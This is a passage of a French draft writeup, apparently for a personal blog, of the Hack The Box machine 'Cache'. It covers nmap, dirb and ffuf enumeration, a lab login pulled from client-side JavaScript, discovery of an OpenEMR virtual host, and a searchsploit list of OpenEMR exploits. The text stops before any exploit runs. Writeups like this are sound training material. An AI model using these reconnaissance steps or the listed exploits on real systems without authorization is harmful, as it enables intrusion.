---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Cache — HTB Medium Writeup & Walkthrough"
linkTitle: "Cache"
slug: "cache"
date: 2026-07-25T09:44:04+02:00
#lastmod: 2026-07-25T09:44:04+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Medium","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Cache"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Cache"
  difficulty: "Medium"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "Plusieurs sessions"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy ou Medium + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy ou Medium) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy ou Medium vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy ou Medium"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy ou Medium + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy ou Medium) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy ou Medium exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy ou Medium")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Cache> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/cache/full_tcp_scan.txt cache.htb
Nmap scan report for cache.htb (10.129.x.x)
Host is up (0.0085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.81 seconds
```

### Scan FTP/SMB

Après le scan initial, le script vérifie la présence éventuelle de services **FTP** ou **SMB** afin de lancer une énumération ciblée si nécessaire :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : cache.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour cache.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "cache.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/cache/aggressive_vuln_scan_raw.txt cache.htb
Nmap scan report for cache.htb (10.129.x.x)
Host is up (0.0073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   6.63 ms 10.10.x.1
2   7.22 ms cache.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 12.47 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cache/cms_vuln_scan.txt cache.htb
Nmap scan report for cache.htb (10.129.x.x)
Host is up (0.0073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.29 (Ubuntu)
|   Last-Modified: Wed, 06 May 2020 09:03:19 GMT
|   ETag: "2001-5a4f70909088c"
|   Accept-Ranges: bytes
|   Content-Length: 8193
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-title: Cache
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; html: 6; jpg: 5
|     /jquery/
|       js: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /jquery/
|   Total files found (by extension):
|_    Other: 1; html: 6; jpg: 5; js: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-enum: 
|_  /login.html: Possible admin folder
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.01 seconds
```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/cache/udp_vuln_scan.txt cache.htb
Nmap scan report for cache.htb (10.129.x.x)
Host is up (0.0073s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 7.73 seconds
```

### Énumération des chemins web

La découverte des chemins web est réalisée avec le script dédié {{< script "mon-recoweb" >}}.

```bash
mon-recoweb cache.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt` regroupe les chemins découverts, ce qui évite de devoir parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : cache.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://cache.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/cache.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://cache.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/cache.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/cache.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://cache.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/cache.htb/ffuf_files.json 2>&1 | tee scans_recoweb/cache.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://cache.htb/author.html (CODE:200|SIZE:1522)
http://cache.htb/. (CODE:200|SIZE:8193)
http://cache.htb/contactus.html (CODE:200|SIZE:2539)
http://cache.htb/.htaccess.bak (CODE:403|SIZE:274)
http://cache.htb/.htaccess (CODE:403|SIZE:274)
http://cache.htb/.htc (CODE:403|SIZE:274)
http://cache.htb/.ht (CODE:403|SIZE:274)
http://cache.htb/.htgroup (CODE:403|SIZE:274)
http://cache.htb/.htm (CODE:403|SIZE:274)
http://cache.htb/.html (CODE:403|SIZE:274)
http://cache.htb/.htpasswd (CODE:403|SIZE:274)
http://cache.htb/.htpasswds (CODE:403|SIZE:274)
http://cache.htb/.htuser (CODE:403|SIZE:274)
http://cache.htb/index.html (CODE:200|SIZE:8193)
http://cache.htb/javascript/
http://cache.htb/javascript/ (CODE:301|SIZE:311)
http://cache.htb/jquery/
http://cache.htb/jquery/ (CODE:301|SIZE:307)
http://cache.htb/login.html (CODE:200|SIZE:2421)
http://cache.htb/logo.gif (CODE:200|SIZE:490849)
http://cache.htb/news.html (CODE:200|SIZE:7235)
http://cache.htb/.php (CODE:403|SIZE:274)
http://cache.htb/server-status (CODE:403|SIZE:274)
http://cache.htb/server-status/ (CODE:403|SIZE:274)
http://cache.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://cache.htb/index.html (CODE:200|SIZE:8193)
http://cache.htb/javascript/
http://cache.htb/jquery/
http://cache.htb/server-status (CODE:403|SIZE:274)

[FFUF — DIRECTORIES]
http://cache.htb/javascript/ (CODE:301|SIZE:311)
http://cache.htb/jquery/ (CODE:301|SIZE:307)
http://cache.htb/server-status/ (CODE:403|SIZE:274)

[FFUF — FILES]
http://cache.htb/author.html (CODE:200|SIZE:1522)
http://cache.htb/. (CODE:200|SIZE:8193)
http://cache.htb/contactus.html (CODE:200|SIZE:2539)
http://cache.htb/.htaccess.bak (CODE:403|SIZE:274)
http://cache.htb/.htaccess (CODE:403|SIZE:274)
http://cache.htb/.htc (CODE:403|SIZE:274)
http://cache.htb/.ht (CODE:403|SIZE:274)
http://cache.htb/.htgroup (CODE:403|SIZE:274)
http://cache.htb/.htm (CODE:403|SIZE:274)
http://cache.htb/.html (CODE:403|SIZE:274)
http://cache.htb/.htpasswd (CODE:403|SIZE:274)
http://cache.htb/.htpasswds (CODE:403|SIZE:274)
http://cache.htb/.htuser (CODE:403|SIZE:274)
http://cache.htb/index.html (CODE:200|SIZE:8193)
http://cache.htb/login.html (CODE:200|SIZE:2421)
http://cache.htb/logo.gif (CODE:200|SIZE:490849)
http://cache.htb/news.html (CODE:200|SIZE:7235)
http://cache.htb/.php (CODE:403|SIZE:274)
http://cache.htb/wp-forum.phps (CODE:403|SIZE:274)
```



### Recherche de vhosts

Enfin, la présence éventuelle de vhosts est vérifiée à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains cache.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : cache.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=8193 words=973 (Host=gkbxl0hixp.cache.htb)
  Baseline#2: code=200 size=8193 words=973 (Host=3kdrxsow6k.cache.htb)
  Baseline#3: code=200 size=8193 words=973 (Host=0ispdxhnct.cache.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains cache.htb END ===
```



Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

### Exploration de l’application web `cache.htb`

À première vue, le site semble offrir très peu de points d’attaque directement exploitables.

L’application web est accessible à l’adresse suivante :

```text
http://cache.htb
```

![Page d’accueil de l’application web cache.htb](cache-htb-home-page.png)

La page d’accueil présente un site personnel dont le titre déroulant affiche explicitement :

```text
cache.htb
```

Le menu de navigation permet d’accéder à plusieurs pages :

```text
index.html
author.html
net.html
login.html
```

La page `author.html` permet d’identifier le prénom de l’auteur du site :

```text
Ash
```

Elle mentionne également explicitement une autre application réalisée par l’auteur, appelée :

```text
HMS
```

![Mention de l’application HMS dans la page de présentation de l’auteur](cache-htb-author-html-hms.png)

La page `login.html` contient une interface de connexion demandant un nom d’utilisateur et un mot de passe :

![Page de connexion de l’application cache.htb](cache-htb-login-html.png)

Une tentative avec des identifiants quelconques ne semble provoquer aucune requête d’authentification vers le serveur. Nous allons donc essayer de comprendre plus précisément le fonctionnement de cette interface.

### Analyse de la page `login.html`

Pour comprendre le fonctionnement du formulaire de connexion, tu peux commencer par afficher le code source de la page `login.html`.

![Code source de la page de connexion de cache.htb](cache-htb-login-html-source.png)

Le formulaire ne transmet pas directement les identifiants à une page d’authentification côté serveur. Lors de sa soumission, il appelle une fonction JavaScript définie dans le fichier :

```html
<script src="jquery/functionality.js"></script>
```

En cliquant sur le lien `jquery/functionality.js` depuis le code source de la page, le navigateur affiche directement le code source de ce fichier.

![Recherche dans le fichier functionality.js](cache-htb-query-functionality-js-source.png)

L’examen de `functionality.js` montre que la vérification des identifiants est réalisée directement dans le navigateur. 

Le code compare les valeurs saisies dans le formulaire à des identifiants inscrits en clair :

```
ash:H@v3_fun
```

Comme `ash` peut également correspondre à un utilisateur local de la machine, tu testes immédiatement ces identifiants sur le service SSH :

```
ssh ash@cache.htb
```

Le mot de passe `H@v3_fun` n’est toutefois pas accepté. À ce stade, tu conserves néanmoins ces identifiants pour de futurs essais.

Tu peux alors utiliser ces identifiants dans le formulaire de connexion. L’authentification réussit et redirige vers la page suivante :

![Message « Welcome Back » affiché après la connexion à cache.htb](cache-htb-net-html_welcome-back.png)



Cette page est encore en construction et ne fournit pas immédiatement de nouvelle fonctionnalité exploitable. Les identifiants découverts doivent néanmoins être conservés, car ils pourront correspondre à un autre service ou à un compte local présent sur la machine

### Identification du virtual host `hms.htb`

La mention de l’application **HMS** laisse penser qu’une seconde application pourrait être hébergée sur la même machine. Comme le site principal utilise le nom `cache.htb`, tu peux raisonnablement tester le nom suivant :

```text
hms.htb
```

Pour vérifier cette hypothèse, tu ajoutes ce nom dans le fichier `/etc/hosts` en l’associant à l’adresse IP de la cible :

```text
10.129.x.x cache.htb hms.htb
```

Tu peux ensuite ouvrir le nouveau virtual host dans le navigateur :

```text
http://hms.htb
```

La page affichée correspond à une interface de connexion **OpenEMR**.

![Page de connexion OpenEMR sur hms.htb](hms-htb-openemr-login.png)

Comme tu disposes déjà des identifiants découverts dans `functionality.js`, tu essaies également de les utiliser sur cette interface :

```
ash:H@v3_fun
```

La tentative échoue : ces identifiants ne permettent donc pas de se connecter à OpenEMR. 

### Énumération web de `hms.htb` avec `mon-recoweb`

Maintenant que l’existence du virtual host `hms.htb` est confirmée, tu peux poursuivre son énumération web avec `mon-recoweb` :

```bash
mon-recoweb hms.htb
```

Cette étape te permet de rechercher les répertoires et fichiers accessibles sur le nouveau virtual host, tout en conservant les résultats dans un répertoire distinct de ceux de `cache.htb`.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : hms.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://hms.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/hms.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://hms.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/hms.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/hms.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://hms.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/hms.htb/ffuf_files.json 2>&1 | tee scans_recoweb/hms.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://hms.htb/admin.php (CODE:200|SIZE:937)
http://hms.htb/build.xml (CODE:200|SIZE:6102)
http://hms.htb/ci/ (CODE:301|SIZE:299)
http://hms.htb/cloud/ (CODE:301|SIZE:302)
http://hms.htb/. (CODE:302|SIZE:0)
http://hms.htb/common/
http://hms.htb/common/ (CODE:301|SIZE:303)
http://hms.htb/config/
http://hms.htb/config/ (CODE:301|SIZE:303)
http://hms.htb/contrib/
http://hms.htb/contrib/ (CODE:301|SIZE:304)
http://hms.htb/controller.php (CODE:200|SIZE:37)
http://hms.htb/controllers/
http://hms.htb/controllers/ (CODE:301|SIZE:308)
http://hms.htb/custom/
http://hms.htb/custom/ (CODE:301|SIZE:303)
http://hms.htb/Documentation/ (CODE:301|SIZE:310)
http://hms.htb/entities/ (CODE:301|SIZE:305)
http://hms.htb/.htaccess.bak (CODE:403|SIZE:272)
http://hms.htb/.htaccess (CODE:403|SIZE:272)
http://hms.htb/.htc (CODE:403|SIZE:272)
http://hms.htb/.ht (CODE:403|SIZE:272)
http://hms.htb/.htgroup (CODE:403|SIZE:272)
http://hms.htb/.htm (CODE:403|SIZE:272)
http://hms.htb/.html (CODE:403|SIZE:272)
http://hms.htb/.htpasswd (CODE:403|SIZE:272)
http://hms.htb/.htpasswds (CODE:403|SIZE:272)
http://hms.htb/.htuser (CODE:403|SIZE:272)
http://hms.htb/images/
http://hms.htb/images/ (CODE:301|SIZE:303)
http://hms.htb/index.php (CODE:302|SIZE:0)
http://hms.htb/interface/
http://hms.htb/interface/ (CODE:301|SIZE:306)
http://hms.htb/javascript/
http://hms.htb/javascript/ (CODE:301|SIZE:307)
http://hms.htb/library/
http://hms.htb/library/ (CODE:301|SIZE:304)
http://hms.htb/LICENSE (CODE:200|SIZE:35147)
http://hms.htb/LICENSE/ (CODE:200|SIZE:35147)
http://hms.htb/modules/
http://hms.htb/modules/ (CODE:301|SIZE:304)
http://hms.htb/myportal/ (CODE:301|SIZE:305)
http://hms.htb/patients/ (CODE:301|SIZE:305)
http://hms.htb/.php (CODE:403|SIZE:272)
http://hms.htb/portal/
http://hms.htb/portal/ (CODE:301|SIZE:303)
http://hms.htb/public/
http://hms.htb/public/ (CODE:301|SIZE:303)
http://hms.htb/repositories/ (CODE:301|SIZE:309)
http://hms.htb/server-status (CODE:403|SIZE:272)
http://hms.htb/server-status/ (CODE:403|SIZE:272)
http://hms.htb/services/
http://hms.htb/services/ (CODE:301|SIZE:305)
http://hms.htb/setup.php (CODE:200|SIZE:1214)
http://hms.htb/sites/
http://hms.htb/sites/ (CODE:301|SIZE:302)
http://hms.htb/sql/
http://hms.htb/sql/ (CODE:301|SIZE:300)
http://hms.htb/templates/
http://hms.htb/templates/ (CODE:301|SIZE:306)
http://hms.htb/tests/
http://hms.htb/tests/ (CODE:301|SIZE:302)
http://hms.htb/vendor/
http://hms.htb/vendor/ (CODE:301|SIZE:303)
http://hms.htb/version.php (CODE:200|SIZE:0)
http://hms.htb/wp-forum.phps (CODE:403|SIZE:272)

=== Détails par outil ===

[DIRB]
http://hms.htb/admin.php (CODE:200|SIZE:937)
http://hms.htb/common/
http://hms.htb/config/
http://hms.htb/contrib/
http://hms.htb/controllers/
http://hms.htb/custom/
http://hms.htb/images/
http://hms.htb/index.php (CODE:302|SIZE:0)
http://hms.htb/interface/
http://hms.htb/javascript/
http://hms.htb/library/
http://hms.htb/LICENSE (CODE:200|SIZE:35147)
http://hms.htb/modules/
http://hms.htb/portal/
http://hms.htb/public/
http://hms.htb/server-status (CODE:403|SIZE:272)
http://hms.htb/services/
http://hms.htb/sites/
http://hms.htb/sql/
http://hms.htb/templates/
http://hms.htb/tests/
http://hms.htb/vendor/

[FFUF — DIRECTORIES]
http://hms.htb/ci/ (CODE:301|SIZE:299)
http://hms.htb/cloud/ (CODE:301|SIZE:302)
http://hms.htb/common/ (CODE:301|SIZE:303)
http://hms.htb/config/ (CODE:301|SIZE:303)
http://hms.htb/contrib/ (CODE:301|SIZE:304)
http://hms.htb/controllers/ (CODE:301|SIZE:308)
http://hms.htb/custom/ (CODE:301|SIZE:303)
http://hms.htb/Documentation/ (CODE:301|SIZE:310)
http://hms.htb/entities/ (CODE:301|SIZE:305)
http://hms.htb/images/ (CODE:301|SIZE:303)
http://hms.htb/interface/ (CODE:301|SIZE:306)
http://hms.htb/javascript/ (CODE:301|SIZE:307)
http://hms.htb/library/ (CODE:301|SIZE:304)
http://hms.htb/LICENSE/ (CODE:200|SIZE:35147)
http://hms.htb/modules/ (CODE:301|SIZE:304)
http://hms.htb/myportal/ (CODE:301|SIZE:305)
http://hms.htb/patients/ (CODE:301|SIZE:305)
http://hms.htb/portal/ (CODE:301|SIZE:303)
http://hms.htb/public/ (CODE:301|SIZE:303)
http://hms.htb/repositories/ (CODE:301|SIZE:309)
http://hms.htb/server-status/ (CODE:403|SIZE:272)
http://hms.htb/services/ (CODE:301|SIZE:305)
http://hms.htb/sites/ (CODE:301|SIZE:302)
http://hms.htb/sql/ (CODE:301|SIZE:300)
http://hms.htb/templates/ (CODE:301|SIZE:306)
http://hms.htb/tests/ (CODE:301|SIZE:302)
http://hms.htb/vendor/ (CODE:301|SIZE:303)

[FFUF — FILES]
http://hms.htb/admin.php (CODE:200|SIZE:937)
http://hms.htb/build.xml (CODE:200|SIZE:6102)
http://hms.htb/. (CODE:302|SIZE:0)
http://hms.htb/controller.php (CODE:200|SIZE:37)
http://hms.htb/.htaccess.bak (CODE:403|SIZE:272)
http://hms.htb/.htaccess (CODE:403|SIZE:272)
http://hms.htb/.htc (CODE:403|SIZE:272)
http://hms.htb/.ht (CODE:403|SIZE:272)
http://hms.htb/.htgroup (CODE:403|SIZE:272)
http://hms.htb/.htm (CODE:403|SIZE:272)
http://hms.htb/.html (CODE:403|SIZE:272)
http://hms.htb/.htpasswd (CODE:403|SIZE:272)
http://hms.htb/.htpasswds (CODE:403|SIZE:272)
http://hms.htb/.htuser (CODE:403|SIZE:272)
http://hms.htb/index.php (CODE:302|SIZE:0)
http://hms.htb/.php (CODE:403|SIZE:272)
http://hms.htb/setup.php (CODE:200|SIZE:1214)
http://hms.htb/version.php (CODE:200|SIZE:0)
http://hms.htb/wp-forum.phps (CODE:403|SIZE:272)
```

Parmi les ressources découvertes, la page suivante mérite une attention particulière :

```html
http://hms.htb/admin.php
```



En la consultant depuis le navigateur, tu obtiens l’interface **OpenEMR Site Administration**, qui révèle directement la version installée :

```text
5.0.1 (3)
```

![Page d’administration d’OpenEMR affichant la version 5.0.1 (3)](hms-htb-openemr-site-administration.png)



Cette information est particulièrement utile, car elle permet désormais de rechercher des vulnérabilités correspondant précisément à cette version d’OpenEMR.

### Recherche de vulnérabilités connues

Maintenant que la version `5.0.1 (3)` d’OpenEMR est connue, tu peux rechercher les exploits disponibles avec `searchsploit` :

```bash
searchsploit openemr 5.0.1
```

La commande retourne plusieurs résultats :

```bash
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                                                           | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                                                                    | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                                                    | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                                  | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                                              | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                                     | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                                                      | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                                      | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                                                  | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                                                              | php/webapps/50087.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Comme la cible utilise précisément la version `5.0.1.3`, tu vas privilégier les exploits écrits en Python, car ils sont généralement plus simples à lire, à tester et à adapter si une incompatibilité apparaît, ce qui te laisse les trois scripts suivants :

```
